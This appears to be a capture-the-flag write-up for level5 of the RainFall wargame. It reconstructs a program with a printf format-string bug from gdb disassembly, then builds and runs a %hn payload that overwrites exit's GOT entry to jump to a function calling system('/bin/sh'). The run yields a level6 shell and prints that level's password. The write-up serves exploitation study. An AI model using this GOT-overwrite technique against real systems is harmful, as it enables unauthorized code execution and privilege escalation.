## level5

```console
(gdb) disas n
Dump of assembler code for function n:
=> 0x080484c2 <+0>:     push   ebp
   0x080484c3 <+1>:     mov    ebp,esp
   0x080484c5 <+3>:     sub    esp,0x218
   0x080484cb <+9>:     mov    eax,ds:0x8049848
   0x080484d0 <+14>:    mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:    mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:    lea    eax,[ebp-0x208]
   0x080484e2 <+32>:    mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    eax,[ebp-0x208]
   0x080484f0 <+46>:    mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     sub    esp,0x18
   0x080484aa <+6>:     mov    DWORD PTR [esp],0x80485f0
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    mov    DWORD PTR [esp],0x1
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void shell() {
    system("/bin/sh");
    _exit(1);
}

void cat() {
    char s[520];

    fgets(s, 512, stdin);
    printf(s);
    exit(1);
}

int main() { cat(); }
```

```console
(gdb) p n 
$3 = {<text variable, no debug info>} 0x80484c2 <n>
(gdb) p o
$4 = {<text variable, no debug info>} 0x80484a4 <o>
```

```console
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0x08048390  _exit
0x08048390  _exit@plt
0x080483d0  exit
0x080483d0  exit@plt
0xb7e5ebe0  exit
0xb7ee41d8  _exit
```

```console
level5@RainFall:~$ objdump -R ./level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```

```console
$ python -c 'print("wwww" + " %x" * 10)' | ./level5
wwww 200 b7fd1ac0 b7ff37d0 77777777 20782520 25207825 78252078 20782520 25207825 78252078
```

o = 0x80484a4 = 134513828 = (2052, 33956)
exit@got = 08049838 = 134518840 = (2052, 38968)

Payload :
- exit@got low
- exit@got high
- 2052 - 8 = 2044 dummy chars
- %4$hn : write 2052 to 4th argument (actually start of format string)
- 33956 - 2052 = 31904 dummy chars
- %5$hn : write 33956 to 5th argument (actually start of format string + 4)

```console
level5@RainFall:~$ (python -c 'print("\x3a\x98\x04\x08\x38\x98\x04\x08" + "%2044d%4$hn%31904d%5$hn")' ; cat) | ./level5
[...]
$ whoami
level6
$ cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
